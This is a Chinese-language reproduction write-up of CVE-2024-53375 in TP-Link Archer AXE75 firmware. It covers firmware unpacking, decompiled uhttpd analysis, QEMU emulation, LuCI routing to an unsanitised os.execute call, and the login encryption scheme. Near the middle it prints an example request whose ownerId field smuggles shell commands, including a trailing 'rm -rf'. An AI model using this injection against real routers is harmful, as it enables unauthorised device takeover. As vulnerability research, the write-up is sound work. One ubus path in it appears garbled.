# TP-Link Archer AXE75漏洞复现
> 李克用
> 来源：https://www.iotsec-zone.com/article/508

## 漏洞情报

**CVE-2024-53375**：TP-Link Archer系列路由器存在一个已认证的远程代码执行（RCE）漏洞。该漏洞存在于TP-Link提供的HomeShield功能中的"tmp_get_sites"函数内。即使未启用HomeShield功能，此漏洞仍可被利用。

本文采用Archer AXE75(EU)_V1_1.2.2 Build 20240827固件进行分析、复现和挖掘

## 信息收集

拿到固件，binwalk解包，进入squashfs-root目录下

![0.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhnttacqwbpd1ql9.png)

看到是ARM架构32位

我们找到web服务器usr/sbin/uhttpd

## uhttpd分析

### main函数

找到uhttpd的`main`函数。该函数用于启动一个轻量级Web服务器

以下按代码逻辑顺序分析各部分功能和实现细节，跳过不需要部分，命令行参数解析部分重点展开。

####   命令行参数解析

```c
while ( 1 )
{
    v11 = getopt(argc, (char *const *)argv, "fSDRC:K:N:E:I:p:s:h:c:l:L:d:r:m:n:x:i:t:T:A:u:U:");
    v12 = v11;
    if ( v11 <= 0 )
        break;
    switch ( v11 )
    {
        case 'A': ... case 'C': ... case 'D': ... /* 其他选项 */
        default:
            v37 = "Usage: %s -p [addr:]port [-h docroot]
" /* 使用说明 */
            v36 = *argv;
            goto LABEL_91;
    }
}
```

- **功能**：解析命令行参数，配置服务器的运行参数。
- **逻辑**：
  - 使用`getopt`循环处理选项，选项字符串为`"fSDRC:K:N:E:I:p:s:h:c:l:L:d:r:m:n:x:i:t:T:A:u:U:"`。
  - 将当前选项存入`v11`（并复制到`v12`），若`v11 <= 0`，退出循环。
  - 使用`switch`根据选项字符执行对应逻辑。
  - 无效选项打印使用说明并退出。
- **选项字符串**：
  - 无参数选项：`f`, `S`, `D`, `R`, `l`, `L`。
  - 带参数选项：`C:`, `K:`, `N:`, `E:`, `I:`, `p:`, `s:`, `h:`, `c:`, `d:`, `r:`, `m:`, `n:`, `x:`, `i:`, `t:`, `T:`, `A:`, `u:`, `U:`。
  - `optarg`存储带参数选项的值。

##### 各选项详细分析

以下部分分析`switch`中的选项逻辑和功能：

`-A`：设置最大活动连接数

```c
case 'A':
    v46 = atoi((const char *)optarg);
    p_tm_isdst = &filename[93].tm_isdst;
    goto LABEL_108;
LABEL_108:
    *p_tm_isdst = v46;
    continue;
```

- **功能**：设置服务器的最大活动连接数。
- **逻辑**：将`optarg`转换为整数（`atoi`），存储在`filename[93].tm_isdst`。
- **细节**：影响服务器的并发处理能力，复用`struct tm`字段存储配置。

`-R`：启用RFC1918过滤

```c
case 'R':
    p_tm_year = &filename[93].tm_yday;
    goto LABEL_104;
```

- **功能**：启用RFC1918私有地址过滤。
- **逻辑**：设置`filename[93].tm_yday=1`。
- **细节**：限制私有IP访问。

`-T`：设置网络超时

```c
case 'T':
    v46 = atoi((const char *)optarg);
    p_tm_isdst = &filename[93].tm_wday;
    goto LABEL_108;
```

- **功能**：设置网络超时时间（秒）。
- **逻辑**：将`optarg`转换为整数，存储在`filename[93].tm_wday`。
- **细节**：默认30秒。

`-U`：设置ubus socket路径

```c
case 'U':
    v48 = (int)optarg;
    p_tm_min = (struct tm *)&filename[94].tm_min;
    goto LABEL_110;
LABEL_110:
    p_tm_min->tm_sec = v48;
    continue;
```

- **功能**：覆盖ubus socket路径。
- **逻辑**：将`optarg`存储在`filename[94].tm_min`。
- **细节**：默认路径为`/var Rats/ubus.sock`。

`-h`：设置文档根目录

```c
case 'h':
    if ( realpath((const char *)optarg, (char *)filename) )
        continue;
    v39 = (const char *)optarg;
    v40 = (FILE *)stderr;
    v41 = _errno_location();
    v42 = strerror(*v41);
    fprintf(v40, "Error: Invalid directory %s: %s
", v39, v42);
    goto LABEL_82;
```

- **功能**：指定文档根目录。
- **逻辑**：
  - 使用`realpath`解析`optarg`到`filename`，验证路径。
  - 如果无效，打印错误并退出。
- **细节**：默认根目录为`.`。

`-n`：设置最大并发请求数

```c
case 'n':
    v46 = atoi((const char *)optarg);
    p_tm_isdst = &filename[93].tm_gmtoff;
    goto LABEL_108;
```

- **功能**：设置最大并发请求数。
- **逻辑**：将`optarg`转换为整数，存储在`filename[93].tm_gmtoff`。
- **细节**：默认值8。

`-p`、`-s`：绑定端口（普通或TLS）

```c
case 'p':
case 's':
    memset(v107, 0, sizeof(v107));
    v16 = (const char *)optarg;
    v17 = strrchr((const char *)optarg, 58);
    if ( v17 )
    {
        v18 = v17 - v16;
        v19 = *(unsigned __int8 *)v16 == 91;
        if ( v16 >= v17 )
            v19 = 0;
        if ( v19 && *(v17 - 1) == 93 )
        {
            v18 -= 2;
            v20 = v16 + 1;
            if ( v18 >= 0x80 )
                v18 = 128;
        }
        else
        {
            v20 = v16;
            if ( v18 >= 0x80 )
                v18 = 128;
        }
        v16 = v17 + 1;
        memcpy(v107, v20, v18);
    }
    if ( v12 != 115 )
        goto LABEL_38;
    if ( sub_149F8(filename) )
    {
        fprintf((FILE *)stderr, "Notice: TLS support is disabled, ignoring '-s %s'
", optarg);
        continue;
    }
    v98 = 1;
LABEL_38:
    v101 = 1;
    if ( v107[0] )
        v21 = v107;
    else
        v21 = 0;
    pai[0] = 0;
    v22 = getaddrinfo(v21, v16, &req, pai);
    /* 后续网络初始化逻辑 */
```

- **功能**：
  - `-p`：绑定普通HTTP端口。
  - `-s`：绑定HTTPS端口（需TLS支持）。
- **逻辑**：
  - 解析`optarg`格式为`[addr]:port`（支持IPv6）。
  - 分割地址（存入`v107`）和端口（存入`v16`）。
  - 对于`-s`，检查TLS支持，若不支持则忽略并设置`v98=1`。
  - 调用`getaddrinfo`解析地址，创建套接字，绑定端口。
- **细节**：
  - 支持IPv4/IPv6，地址为空时绑定所有接口。
  - TLS端口需`-C`和`-K`配合。

`-r`：设置认证领域

```c
case 'r':
    v48 = optarg;
    p_tm_min = (struct tm *)&filename[93].tm_min;
    goto LABEL_110;
```

- **功能**：设置基本认证的领域名称。
- **逻辑**：将`optarg`存储在`filename[93].tm_min`。
- **细节**：默认`"Protected Area"`。

`-t`：设置脚本超时

```c
case 't':
    v46 = atoi((const char *)optarg);
    p_tm_isdst = &filename[94].tm_wday;
    goto LABEL_108;
```

- **功能**：设置CGI/Lua/ubus脚本超时时间（秒）。
- **逻辑**：将`optarg`转换为整数，存储在`filename[94].tm_wday`。
- **细节**：默认60秒。

`-x`：设置CGI处理URL前缀

```c
case 'x':
    v48 = optarg;
    p_tm_min = (struct tm *)&filename[93].tm_zone;
    goto LABEL_110;
```

- **功能**：指定CGI处理器的URL前缀。
- **逻辑**：将`optarg`存储在`filename[93].tm_zone`。
- **细节**：默认`/cgi-bin`。

默认情况

```c
default:
    v37 = "Usage: %s -p [addr:]port [-h docroot]
" /* 详细使用说明 */
    v36 = *argv;
    goto LABEL_91;
LABEL_91:
    fprintf(v38, v37, v36);
    goto LABEL_82;
```

- **功能**：处理无效选项，打印使用说明并退出。
- **逻辑**：输出程序用法，设置退出状态`v35=1`。

#####  参数验证

```c
if ( v9 <= 1 )
    v13 = v98;
else
    v13 = 0;
if ( v13 )
{
    v14 = "Error: Missing private key or certificate file
";
    v15 = (FILE *)stderr;
    goto LABEL_81;
}
if ( !v96 )
{
    v14 = "Error: No sockets bound, unable to continue
";
    v15 = (FILE *)stderr;
    goto LABEL_81;
}
```

- **功能**：验证命令行参数完整性。
- **逻辑**：
  - 如果启用了`-s`（`v98=1`）且`v9<=1`（缺少证书或私钥），报错退出。
  - 如果`v96=0`（无成功绑定的套接字），报错退出。
- **细节**：
  - `v9`确保TLS配置完整（需`-C`和`-K`）。
  - `v96`记录绑定的套接字数量。

#### 网络初始化

```c
v25 = pai[0];
v97 = 0;
while ( 2 )
{
    if ( v25 )
    {
        v26 = socket(v25->ai_family, v25->ai_socktype, v25->ai_protocol);
        v27 = v26;
        if ( setsockopt(v26, 1, 2, &v101, 4u) )
            goto LABEL_53;
        if ( filename[93].tm_isdst > 0 )
        {
            v104 = 3;
            tm_isdst = filename[93].tm_isdst;
            optval = 1;
            if ( setsockopt(v27, 1, 9, &v101, 4u)
              || setsockopt(v27, 6, 4, &optval, 4u)
              || setsockopt(v27, 6, 5, &tm_isdst, 4u)
              || setsockopt(v27, 6, 6, &v104, 4u) )
            {
                v29 = (FILE *)stderr;
                v30 = _errno_location();
                v31 = strerror(*v30);
                fprintf(v29, "Notice: Unable to enable TCP keep-alive: %s
", v31);
            }
        }
        if ( v25->ai_family == 10 && setsockopt(v27, 41, 26, &v101, 4u) == -1 )
            goto LABEL_53;
        if ( bind(v27, v25->ai_addr, v25->ai_addrlen) == -1 )
            goto LABEL_54;
        if ( listen(v27, 64) == -1 )
            goto LABEL_54;
        v32 = uh_listener_add(v27, filename);
        if ( v32 )
        {
            if ( v12 == 115 )
                p_tm_mon = &filename[94].tm_mon;
            else
                p_tm_mon = 0;
            if ( v12 == 115 )
                p_tm_mon = (int *)p_tm_mon[6];
            *(_DWORD *)(v32 + 52) = p_tm_mon;
            v34 = fcntl(v27, 1);
            fcntl(v27, 2, v34 | 1);
            uh_ufd_add(v32, sub_14858, 65);
            ++v97;
        }
        else
        {
            fputs("uh_listener_add(): Failed to allocate memory
", (FILE *)stderr);
        }
        if ( v27 > 0 )
            close(v27);
LABEL_51:
        v25 = v25->ai_next;
        continue;
    }
    break;
}
freeaddrinfo(pai[0]);
v96 += v97;
```

- **功能**：创建TCP套接字，绑定地址和端口，启动监听。
- **逻辑**：
  - 使用`getaddrinfo`解析地址（从`-p`或`-s`）。
  - 为每个地址创建套接字，设置`SO_REUSEADDR`和TCP keep-alive（若启用）。
  - 调用`bind`和`listen`，最大连接数64。
  - 使用`uh_listener_add`注册监听器到事件循环。
  - 增加`v97`（成功绑定计数），释放地址信息。
  - 更新`v96`（总绑定计数）。
- **细节**：
  - 支持IPv4/IPv6，TCP keep-alive增强连接稳定性。
  - `uh_ufd_add`将套接字加入事件循环，回调函数为`sub_14858`，后续如果想进一步分析http服务从这里入手。

####  服务器配置

```c
uh_get_operation_mode(&dword_2B45C);
uh_get_local_addr(&dword_2B45C);
uh_get_admin_config(&dword_2B45C);
if ( filename[93].tm_gmtoff <= 0 )
    filename[93].tm_gmtoff = 8;
if ( filename[93].tm_wday <= 0 )
    filename[93].tm_wday = 30;
if ( !uh_index_files )
{
    if ( byte_2B41C[0] )
    {
        memset(pai, 0, 0x80u);
        sprintf((char *)pai, "index.%shtml", byte_2B41C);
        uh_index_add(pai);
    }
    uh_index_add("index.html");
    uh_index_add("index.htm");
    uh_index_add("default.html");
    uh_index_add("default.htm");
}
if ( filename[94].tm_wday <= 0 )
    filename[94].tm_wday = 60;
if ( !filename[93].tm_zone )
    filename[93].tm_zone = "/cgi-bin";
```

- **功能**：设置服务器运行模式、地址和默认配置。
- **逻辑**：
  - 调用`uh_get_operation_mode`、`uh_get_local_addr`、`uh_get_admin_config`配置服务器。
  - 设置默认值：最大并发请求数8（`tm_gmtoff`）、网络超时30秒（`tm_wday`）、脚本超时60秒（`filename[94].tm_wday`）、CGI前缀`/cgi-bin`（`tm_zone`）。
  - 如果未指定索引页面，添加`index.html`等默认页面。
- **细节**：
  - 默认索引页面支持`byte_2B41C`前缀（如`index.<prefix>html`）。

####  插件加载与ubus

```c
v64 = dlopen("uhttpd_ubus.so", 257);
if ( v64 )
{
    filename[94].tm_mday = (int)dlsym(v64, "uh_ubus_init");
    ...
}
v68 = ubus_connect("/var/run/ubus.sock");
dword_2B4AC = v68;
uloop_run(v88);
```

- **功能**：加载`uhttpd_ubus.so`插件并连接到ubus服务。

- **逻辑**：
  - 使用`dlopen`加载`uhttpd_ubus.so`，查找`uh_ubus_init`、`uh_ubus_close`、`uh_ubus_request`符号。
  - 如果加载成功，调用`uh_ubus_init`初始化ubus。
  - 连接到`/var/run/ubus.sock`，存储连接句柄到`dword_2B4AC`。
  - 将ubus连接加入事件循环（`uloop_fd_add`）。
  - 调用`ubus_add_object`注册对象。
- **细节**：
  - ubus用于系统服务通信。
  - 插件加载失败会打印警告但继续运行。

### http请求处理函数调用链

#### sub_14858

接受一个新的客户端连接，并对其进行初始化和安全检查，最后调用`sub_14784`处理HTTP请求

![1.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuho952oa1eqybu3a.png)

#### sub_14784

函数 `sub_14784` 是一个典型的 HTTP请求处理函数，用于处理已建立连接的客户端的数据接收与状态解析。在条件正确时跳转到`sub_14760`

![2.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhoenfmaptzafg9w.png)

![3.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhofqdcangkue80p.png)

#### sub_13FDC

函数`sub_13FDC`是一个完整的 HTTP 请求处理器，负责从 TCP 流中读取并解析完整的 HTTP 请求头，验证安全性，进行身份认证，路由请求到 CGI 或静态资源，并启动响应流程。下面是解析请求行片段展示

![4.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhomdw8s7sxueyae.png)

重点看到CGI路由，`uh_path_lookup(v2, v43)`解析出路径后传给`uh_cgi_request(v2, v53, v48)`

![5.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhoskn241ktrybby.png)

![6.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhou9d8a7s6nstkb.png)

#### uh_cgi_request

函数 `uh_cgi_request` 是一个CGI（通用网关接口）请求处理器，用于在嵌入式 Web 服务器中执行外部 CGI 脚本，并将输出返回给客户端。

函数解析请求参数并设为环境变量，用以和外部程序交互，如下图

![7.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhozyjw6dq9lhtbt.png)

函数调用a3表示的外部处理程序，地址a3为`uh_path_lookup`解析生成

![8.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhp400dei09k0ia4.png)

### 总结

该固件主要功能在lua层实现，uhttpd只起到一个简单的web服务器框架作用，因此这里只是简单分析。

## 启动uhttpd程序

拿到固件，binwalk解包，进入squashfs-root目录下

复制qemu

```
cp $(which qemu-arm-static) .
```

尝试执行下面这条命令

```sh
sudo chroot . ./qemu-arm-static /usr/sbin/uhttpd -f -h /www -r Archer_AXE300 -x /cgi-bin -t 120 -T 30 -A 1 -n 3 -R -p 0.0.0.0:80
```

![9.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhpkj1m1teh1tpdc.png)

关掉nginx

```
sudo systemctl stop nginx
```

![10.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhptejt9rpki7ozu.png)

挂载两个目录

```
sudo mount --bind /dev ./dev
sudo mount --bind /proc ./proc
```

进入bin/bash

```
sudo chroot . bin/bash
```

启动ubusd

```
ubusd &
```

提示没有usock

![11.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhpytjmrtyo7fali.png)

前文分析到的，根据main函数ubus部分，我们需要给ubus.sock创建文件夹var/run

![12.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhq9s0erbrniltxr.png)

看一下，原文件夹不能用，操作如下

![13.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhqg9fagjfr49qhn.png)

再次启动ubus，退出bash，发现启动ubus成功

![14.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhqqn56vqa9ontbh.png)

重新启动uhttpd成功

![15.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhr34v352o1zaira.png)

用本机ip访问web服务，第一次启动会设置一个密码，之后就用这个密码登录

![16.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhrhr45vzbd2gn3q.png)

![17.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhrkcbm3a23nzxgy.png)

## 漏洞分析

### 漏洞点

漏洞发现者搜索命令执行的危险函数`os.execute`,在usr/lib/lua/luci/model/avira.lua中发现一处危险点，avira是路由器嵌入的一个防毒软件。

![18.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhrrzuj8gfcrs2dz.png)

```
os.execute("cp " .. PROC_PCTL .. ownerId .. " /tmp/visitList")
```

该型号固件lua代码的习惯，全大写的变量如PROC_PCTL一般定义在文件开头表示固定的某个文件，接下来要挖掘RCE漏洞可以忽略这些变量

```
local PROC_BLOCK		= "/proc/block/block_insight"
```

这里的`ownerId`从http请求读取，没有经过输入验证，需要`data`中`siteType=="visit"`、`startIndex == 0`，为了利用漏洞过程不出错，我们给其他需要的变量也给出有效值。

还有一点值得注意的是，我们http接收的data经过json解码，因此，我们发送请求也要经过http编码。

### 路由分析

我们先找一下`function AVIRA_GATHER:tmp_get_sites(app_form)`的调用点，发现在该lua文件找不到，于是在lua层，即`usr/lib/lua`搜索`tmp_get_sites`

![19.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhs1nt639ffimrez.png)

找到`luci/controller/admin/smart_network.lua`的相关片段，先看到一个定义了操作映射的分发表`smart_network_form`

![20.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhs5m22tb5ptxufk.png)

表结构如下

```lua
local smart_network_form = { 
...
	tmp_avira = {
	...
	["getInsightSites"] = {cb = tmp_get_sites},
	...
	}
...
}
```

在表下方就是一个路由逻辑，也可以查找`smart_network_form`的调用找到该逻辑

![21.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhsayour8afrplcn.png)

由`index`注册路由，从这里我们可以确定http请求的url末尾是`/admin/smart_network`。另外两个函数对应`ctl`也就是`luci/model/controller.lua`中的具体实现

![22.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhsf790o85qd97be.png)

`luci/model/controller.lua`有更清楚的传参和函数调用逻辑，`ctl._index`逻辑如下，主要做错误处理，并通过`http.formvalue()`从http请求拿到数据，传给`smart_network.lua`中的`smart_network_dispatch(http_form)`，这个函数再把同一文件下的分发表`smart_network_form`和http数据一起给`ctl.dispatch`

`http.formvalue()`函数涉及http请求格式，后面会重点分析

![23.png](https://www.iotsec-zone.com/api/image/v2/20250805/dbuhsjcs5h1ullbji3.png)

`ctl.dispatch`定义如下，它将http请求中的`form`和`operation`查找`smart_network_form`分发表对应到实际的处理函数，根据我们的目标`tmp_get_sites`，应设置`form=tmp_avira`和`operation=getInsightSites`

```lua
function dispatch(dispatch_tbl, http_form, hook)
    local forms = http_form and http_form["form"]
    local op = http_form and http_form["operation"] or ""

    local success = true
    local own_response
    local errorcode_tbl = {}
    local data, others, errorcode

    local function _action_cb(cb, args)
        local ret, errorcode, error_tbl = cb(unpack(args))
        local data
        if ret then
            data = ret
        else
            success = false
            if errorcode then
                errorcode_tbl[#errorcode_tbl + 1] = errorcode
            end
            if error_tbl then
                data = error_tbl
            end
        end
        return ret, type(data) == "table" and data or nil
    end

    local function _dispatch(form)
        local op_tbl = dispatch_tbl[form]
        local action
        if op_tbl then
            action = op_tbl[op] or op_tbl[".super"]
        end

        if action and action.cb then
            local args = op_tbl[".args"]
                and {http_form, op_tbl[".args"], action.args}
                or {http_form, action.args}
            local ret, data = _action_cb(action.cb, args)

            local others
            if action.others then
                _, others = _action_cb(action.others, args)
            end

            if hook and hook.post_hook then
                _action_cb(hook.post_hook, {ret, action})
            end

            own_response = own_response or action.own_response

            return data, others, action
        else
            success = false
            errorcode_tbl[#errorcode_tbl + 1] = "no such callback"
        end
    end

    local function _merge(tbl, updates, action, form)
        if #updates == 0 then
            -- @updates is a key-value table, or empty array
            local prefix = action and action.merge_prefix
            if prefix then
                util.update_prefix(tbl, updates, prefix)
            else
                util.update(tbl, updates)
            end
        else
            -- @updates is a non-empty array
            util.update(tbl, {[form] = updates})
        end
    end

    if type(forms) ~= "table" then
        -- Single form
        local form = forms
        data, others = _dispatch(form)
    else
        -- Multiple forms
        for _, form in ipairs(forms) do
            local data_ret, others_ret, action = _dispatch(form)
            if data_ret then
                data = data or {}
                _merge(data, data_ret, action, form)
            end

            if others_ret then
                others = others or {}
                _merge(others, others_ret, action, form)
            end
        end
    end

    if #errorcode_tbl > 0 then
        errorcode = table.concat(errorcode_tbl, "&")
    end
 
        return {
            success = success,
            data = data,
            others = others,
            errorcode = errorcode
        }
    
end
```

到这里，我们对进入漏洞点的过程基本分析清楚了。

http请求示例：

```
POST /cgi-bin/luci/;stok=abcd1234/admin/smart_network?form=tmp_avira HTTP/1.1
Host: 192.168.0.1
Content-Length: 512
Content-Type: application/x-www-form-urlencoded
User-Agent: Python-requests/2.28.1
Connection: keep-alive

operation=getInsightSites&sign=<encrypted_signature>&data=<encrypted_data>
```

data内容如下，然后经过json编码。

```
{
  "ownerId": "../uptime /tmp/visitList;/bin/uname -a > /www/poc.txt;rm -rf",
  "date": "today",
  "type": "visit",
  "startIndex": 0,
  "amount": 1
}
```

`"ownerId"`内容可以换成其他命令。

## 登录与请求格式分析

虽然触发漏洞的路径我们已经清楚了，但是TP-Link的登录和请求验证机制较为复杂，需要对Archer系列路由器的登录逻辑进行细致的分析。漏洞发现者使用了触发CVE-2022-30075漏洞在AX50的接入逻辑，写出可以在本漏洞直接使用的EXP。我们当然可以忽略这一部分，但是分析这个“造轮子”的过程也能增加我们对系统接收请求逻辑的认识。在已有现成登录逻辑的情况下，我们的分析也不用走弯路错路。

### 抓包分析

首先，我们先考虑登录逻辑。先通过web页面登录，在登录前后抓包。有三个重要的包，共同点是/login路径，分别是两个请求密钥的包和一个发送密码的包。根据“010001”可以猜测这两组密钥都是RSA公钥

![24.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv0yxefabwpglcwdy.png)

![25.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv0yyug4a6lnfczuo.png)

![26.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv0z04ybtsdxnfgwq.png)

### 登录逻辑

由/login找到`usr/lib/lua/luci/controller/login.lua`

最底下又是我们熟悉的分发逻辑，这套系统的lua层很多应用功能点都是这一套分发逻辑，而底层功能则是靠`local ctl = require "luci.model.controller"`这样的形式调用。要注意的是这里有新旧两套分发表，但对我们功能点没有区别。

![27.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv0z80s7ul6q4wotn.png)

根据三个包的form和operation定位到对应的处理函数（`form=login`包对应的operation已被编码，但是简单分析可以知道是login）

![28.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv0zc53xyufzzzayz.png)

`form=keys`对应的函数如下，从`luci/model/asycrypto.lua`中的`rsa_read_pubkey`函数读取RSA公钥。如下图二所示，读取RSA私钥的函数也在同一位置。这一组公私钥的获取形式都是通过`asycrypto = require("luci.model.asycrypto").Crypto("rsa")`获取，`uci_r:get("accountmgnt", "keys", "n")`会访问`etc/config`下名为"accountmgnt"的文件，文件内容展示在下图三。这一组公钥记为`password_rsa_n`、`password_rsa_e`。

![29.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv0zizgftyxlcaiac.png)

![30.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv0zk8g00kpagqn08.png)

![31.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv0zmgmw4z7rktrdz.png)

`form=auth`对应的函数如下，同时发送了另一组RSA公钥和一个序列。RSA公钥获取方式有别于前面，调用 了`service.read_rsakey()`，我们后面遇到根据获取方式不同即可区分两组密钥

![32.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv107ffceycibuazx.png)

这一组密钥具体获取方式和存储文件如下，记为`sign_rsa_n`、`sign_rsa_e`

![33.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv10ezp5t6vr53ku0.png)

![34.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv10h3d682mpd85gm.png)

![35.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv10icei3ofb1xjh5.png)

获取序列号方式如下，随机生成后保存在本地，序列号记为`sign_seq`

![36.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv10nw6c370r8z7xn.png)

最后看到登录逻辑，`login`函数

首先，参数从http请求获取，由于登录过程我们没输入账号，所以账号为默认`admin`，此外`local rsa2048_enable`决定下面用什么解密方式，很重要，我们查找`etc/config/system`文件发现没有这个值，因此取默认值”false“

![37.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv10udojfn1zr7dud.png)

![38.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv10zchxnkwrjhent.png)

先看到密码解密

![39.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv116u4n912ss85zw.png)

![40.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv117yutuiufidszg.png)

解密函数和`form=keys`对应的获取公钥函数、我们看到的获取私钥函数在同一个文件下，通过`asycrypto = require("luci.model.asycrypto").Crypto("rsa")`调用。因此，我们要提取`form=keys`的响应包中的密钥`password_rsa_n`、`password_rsa_e`加密我们的密码

![41.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv11ho1iho1tdstxq.png)

`login`函数还实现一个重要功能，就是将"admin"和密码拼接计算`hash`，然后将登录用到的各种数据通过`sauth.write`写入cookie，一些数据后面会分析到。

![42.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv11qaiwwbtieinbd.png)

登录后响应会附带一个需要用到的`stok`

### 请求格式确认

在`luci/model/controller.lua`中，前面路由分析时提到的、漏洞点和登录程序都要经过的`ctl._index(dispatch)`函数调用`http.formvalue`从http请求解析数据。

![43.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv12257zux6gnsinp.png)

![44.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv126az0jn6rhk1qm.png)

`luci/http.lua`中相关代码如下，Request在被调用时，构造函数`Request._init_`初始化时，从环境变量中读取URL 中`?`后的内容`env.QUERY_STRING`并初步处理

```lua
params = protocol.urldecode_params(env.QUERY_STRING or "")
```

`urldecode_params`将环境变量`env.QUERY_STRING`解析为键值对，环境变量在前面解读uhttpd的`uh_cgi_request`函数中解析和设置

同时注意初始化`encrypt.need_encrypt = true`和`renew_aeskey = false`、`renew_aeskey = false`，后面会用到

![45.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv12dzibd3yfjnile.png)

![46.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv12kw7qftjmhsaxx.png)

![47.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv12j6gg2cp2vbqs5.png)

然后看到`Request.formvalue`函数,它判断没有读取输入，进入`Request._parse_input_`函数，再打包参数调用`protocol.parse_message_body`，最后将判断读取输入的标志置一。

![48.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv12wix0fpbkr3odh.png)

![49.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv12y5l02zxoej3zh.png)

函数`parse_message_body`读取环境变量中的请求头参数根据抓包内容进入`elseif msg.env.REQUEST_METHOD == "POST" and msg.env.CONTENT_TYPE and msg.env.CONTENT_TYPE:match("^application/x%-www%-form%-urlencoded")`分支

然后前面提到，`encrypt.need_encrypt = true`，调用`urldecode_message_body_decrypt(src, msg)`

![50.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv13aoxur5oar1jms.png)

`urldecode_message_body_decrypt(src, msg)`用于读取、解密并解析 HTTP 请求的消息体，它创建函数读取数据流、验证数据长度，然后解密数据，最后对解密的数据解析键值对。重点看解密逻辑`local decrypted_data = decrypt(data, msg)`

![51.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv13fd3xokg7rpfb8.png)

`decrypt()`函数先匹配请求体中的`sign`和`data`，因此我们的请求体应该写成这两个部分，接着看两个部分分别是什么。

看到一个比较重要的信息：AES加密。解析`sign`的函数`service.analyze_signature(sig, msg.encrypt.renew_aeskey)`传递一个更新AES密钥的标志，据此决定解析`sign`是否提取AES密钥。如果标志为否，AES密钥和`hash`值、序列号`encrypt.seqnum`都已存在，验证`hash`值和序列号；否则`hash`从`sign`中提取，序列号`encrypt.seqnum`现场读取，注意到读序列号的方式和前面`form=auth`请求时收到的序列在同一处做相同处理，即这里读的就是当时生成的序列号。

最后用AES密钥解密`data`，也就是说，无论是否更新密钥，密钥都要是存在的。但是前面`Request`类初始化时，`renew_aeskey`为false，而`aeskey`为nil。也就是说，我们得找到改`renew_aeskey`或者写`aeskey`的地方。

![52.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv13lmddfgtubahbb.png)

![53.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv13ta4j92tdcqp6o.png)

在文件目录下搜索`aeskey`，发现实现改`renew_aeskey`或者写`aeskey`的地方非常少，在`Request`类所在文件`http.lua`中同时存在改标志`renew_aeskey`和写入`aeskey`的程序

![54.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv13ygcvhetwgyk7k.png)

继续利用搜索结果，定位到同一个文件`luci/dispatcher.lua`，且看行数很可能在同一个函数内

![55.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv16y7ncfl3uhx6py.png)

进入文件，相关程序在函数`httpdispatch`下，这个函数在lua层启动时被`usr/lib/lua/luci/sgi/cgi.lua`中的`run`函数调用

![56.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv17fi33ezie2rkjs.png)

函数`httpdispatch`如下，这里先提取了请求的`path`和`form`，然后根据`path`和`form`判断是否需要加密和更新AES密钥。需要就会将`renew_aeskey`置一，同时将需要加解密的标志置一，然后尝试从会话 (sysauth cookie) 中读取加密相关的数据，结合下面的表单我们可以知道系统在登录请求更新AES密钥，在登录后从sysauth cookie中用`sdat = sauth.read(sess, true)`读取相关数据

![57.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv17p3tiuodddlsa6.png)

看一下判断是否需要加密和更新AES密钥其实就是查表，我们也知道我们的前两个包不需要加密和更新AES密钥，而`form=login`包则需要加密和更新AES密钥。

![58.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv1817ma1gofng9rb.png)

![59.png](https://www.iotsec-zone.com/api/image/v2/20250806/dbv18a6mf22zzgjjcx.png)

在登录后，`sdat = sauth.read(sess, true)`从tmp/luci-sessions里的cookie文件里读取，我们可以用root权限看一下内容，当然这部分和我们的分析没什么关系，只是了解系统登录后的认证方式

